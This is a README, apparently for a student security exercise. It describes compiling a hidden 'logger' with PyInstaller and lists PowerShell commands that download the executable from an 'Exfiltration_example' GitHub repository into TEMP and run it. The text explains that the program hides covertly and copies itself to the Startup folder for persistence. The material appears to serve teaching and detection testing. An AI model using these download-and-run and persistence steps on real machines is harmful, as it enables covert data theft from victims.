# Logger Script - Executable Version

This project contains a Python-based logger script that has been compiled into a standalone executable using **PyInstaller**. The executable allows the logger script to run on any Windows machine without the need for Python or external dependencies to be installed.

## Compilation Process

We used **PyInstaller** to compile the Python script into an `.exe` file. The following command was used:

```bash
pyinstaller --onefile --noconsole <file.py>
```

### Explanation of the PyInstaller Options:

- `--onefile`: This option bundles everything (the Python interpreter, libraries, and the script) into a **single executable**. This makes it easier to distribute the program, as you only need to provide the generated `.exe` file.
  
- `--noconsole`: This option ensures that no **console window** (command prompt) is opened when the executable is run. It's particularly useful for GUI applications or scripts that do not require any terminal interaction. If the logger script doesn't need to display anything in the console, this option helps make the application more user-friendly and clean and run in the **background**.

## Testing the script

After compiling, the generated `.exe` file can be found in the `dist` folder. 

To run the script we can use powershell, the following commands:

```bash
cd $env:TEMP
```
```bash
Invoke-WebRequest -Uri "https://github.com/Toghrul000/Exfiltration_example/raw/refs/heads/main/dist/group_9_logger.exe" -OutFile "./group_9_logger.exe"
```
```bash
.\group_9_logger.exe
```

We run the initial script from the temporary folder, since we want to be covert, after that script will try to run and put itself to "C:\Users\YourUsername\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" folder to become persistent. (We assume attacker only has user level access and not admin, so he cannot create a windows service or schtasks persistence).
After a minute or so, Windows defender will generate alert for this. 